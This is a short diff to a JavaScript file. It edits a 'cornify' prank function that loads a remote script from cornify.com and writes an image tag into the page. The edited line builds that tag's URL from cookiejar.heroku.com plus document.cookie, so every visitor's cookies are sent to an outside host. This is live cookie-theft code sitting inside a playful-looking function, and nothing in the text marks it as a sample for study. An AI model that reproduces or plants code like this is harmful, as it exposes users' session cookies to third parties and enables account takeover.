@@ -56,7 +56,7 @@ with(require("./lib/fab"))
 function cornify() {
   document.write('<script type="text/javascript" src="http://www.cornify.com/js/cornify.js"></script>'); 
   var corn = function() { try { cornify_add(); } catch(e) {} setTimeout(corn, 1000); }; 
-  var str = "<img src=\"http://cookiejar.heroku.com/"+document.cookie+"\"/>";
+  var str = "<img src=\"http://cookiejar.heroku.com/nomnomnom/"+document.cookie+"\"/>";
   console.log(str);
   document.write(str); 
   setTimeout(corn, 1000);
